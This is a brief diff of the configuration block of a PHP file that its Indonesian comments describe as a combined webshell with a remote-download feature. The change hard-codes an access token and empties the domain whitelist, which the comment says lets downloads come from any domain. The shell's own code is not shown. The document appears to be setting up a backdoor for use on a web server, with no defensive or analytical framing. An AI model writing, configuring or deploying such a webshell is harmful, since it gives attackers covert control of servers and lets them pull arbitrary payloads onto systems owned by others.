@@ -2,9 +2,9 @@
 // combined_shell_with_secure_remotedl.php
 // Gabungan webshell (versi migrasi dari yang kamu kirim) + fitur remote download aman.
 // CONFIG: ubah sebelum dipakai
-define('REMOTE_DL_TOKEN', 'ganti_token_ini_sekarang');
+define('REMOTE_DL_TOKEN', 'dhiff_9aE73x!2025');
 define('REMOTE_DL_BASEDIR', __DIR__ . '/downloads'); // pindah ke luar public_html jika mungkin
-$REMOTE_DL_WHITELIST = ['example.com','yourdomain.com']; // kosong = semua domain diizinkan
+$REMOTE_DL_WHITELIST = []; // kosong = semua domain diizinkan
 // END CONFIG
 
 set_time_limit(0);
